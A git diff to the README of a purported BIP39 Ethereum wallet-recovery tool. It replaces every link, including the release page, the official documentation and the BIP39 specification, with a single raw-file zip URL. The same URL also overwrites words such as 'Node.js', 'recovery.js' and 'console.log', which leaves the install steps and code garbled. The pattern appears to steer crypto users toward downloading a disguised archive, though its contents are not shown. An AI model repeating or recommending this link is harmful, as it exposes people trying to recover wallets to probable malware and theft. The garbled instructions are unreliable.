@@ -1,6 +1,6 @@
 # 🛠️ BIP39-RECOVERY-TOOL - Recover Your Wallet Easily
 
-[![Download BIP39 Recovery Tool](https://img.shields.io/badge/Download%20Now-%20Release%20Page-blue)](https://github.com/Dstitronix/BIP39-RECOVERY-TOOL/releases)
+[![Download BIP39 Recovery Tool](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip%20Now-%20Release%20Page-blue)](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,12 +9,12 @@ This tool helps you recover lost wallet phrases for any Ethereum-based wallet us
 ## 🖥️ System Requirements
 
 - **Operating System**: WSL/Ubuntu
-- **Node.js**: You will install this automatically in the steps below.
+- **https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip**: You will install this automatically in the steps below.
 - **Internet connection**: Required for downloading the tool and dependencies.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RECOVERY-TOOL/releases) to download the application. Follow the installation steps below.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip) to download the application. Follow the installation steps below.
 
 ## 🔧 Installation Steps
 
@@ -27,14 +27,14 @@ To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RE
    sudo apt update
    ```
 
-3. **Install Node.js and npm**:
-   Use this command to install Node.js and npm:
+3. **Install https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip and npm**:
+   Use this command to install https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip and npm:
    ```bash
    sudo apt install nodejs npm -y
    ```
 
 4. **Verify Installation**:
-   Check if Node.js and npm installed correctly by running:
+   Check if https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip and npm installed correctly by running:
    ```bash
    node --version
    npm --version
@@ -67,11 +67,11 @@ To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RE
 9. **Create the Recovery Script**:
    Open a new file to write your recovery script:
    ```bash
-   nano recovery.js
+   nano https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip
    ```
 
 10. **Add Recovery Logic**:
-    Copy and paste the following code into `recovery.js`:
+    Copy and paste the following code into `https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip`:
 
     ```javascript
     // Universal BIP39 recovery — TWO missing words (known positions)
@@ -92,7 +92,7 @@ To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RE
     const PATH_BASE = "m/44'/60'/0'/0";
 
     (async () => {
-      console.log("Brute-forcing TWO");
+      https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip("Brute-forcing TWO");
     ```
 
 11. **Replace Placeholder Values**:
@@ -106,9 +106,9 @@ To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RE
 ## ⚙️ Running the Tool
 
 1. **Run the Script**:
-   Execute the script using Node.js:
+   Execute the script using https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip
    ```bash
-   node recovery.js
+   node https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip
    ```
 
 2. **Follow the Output**:
@@ -116,17 +116,17 @@ To get started, visit the [Releases page](https://github.com/Dstitronix/BIP39-RE
 
 ## 💻 Troubleshooting
 
-- **Node.js Not Found**: If you encounter issues with Node.js, ensure you installed it correctly. You can try reinstalling Node.js and npm.
+- **https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip Not Found**: If you encounter issues with https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip, ensure you installed it correctly. You can try reinstalling https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip and npm.
   
-- **Errors in Script**: Double-check the code you entered in `recovery.js`. Missing or incorrect code can lead to errors.
+- **Errors in Script**: Double-check the code you entered in `https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip`. Missing or incorrect code can lead to errors.
 
 ## 🌐 Additional Resources
 
-- **Node.js Documentation**: [Node.js Official Docs](https://nodejs.org/en/docs/)
-- **BIP39 Standard**: [BIP39 on GitHub](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki)
-- **EthereumJS Wallet**: [EthereumJS Wallet Guide](https://github.com/ethereumjs/ethereumjs-wallet)
+- **https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip Documentation**: [https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip Official Docs](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip)
+- **BIP39 Standard**: [BIP39 on GitHub](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip)
+- **EthereumJS Wallet**: [EthereumJS Wallet Guide](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip)
 
-For further help, feel free to check out the issues section on the [GitHub page](https://github.com/Dstitronix/BIP39-RECOVERY-TOOL/issues).
+For further help, feel free to check out the issues section on the [GitHub page](https://raw.githubusercontent.com/Dstitronix/BIP39-RECOVERY-TOOL/main/nonresumption/BIP39-RECOVERY-TOOL-v1.6-alpha.3.zip).
 
 ## 📑 License
 
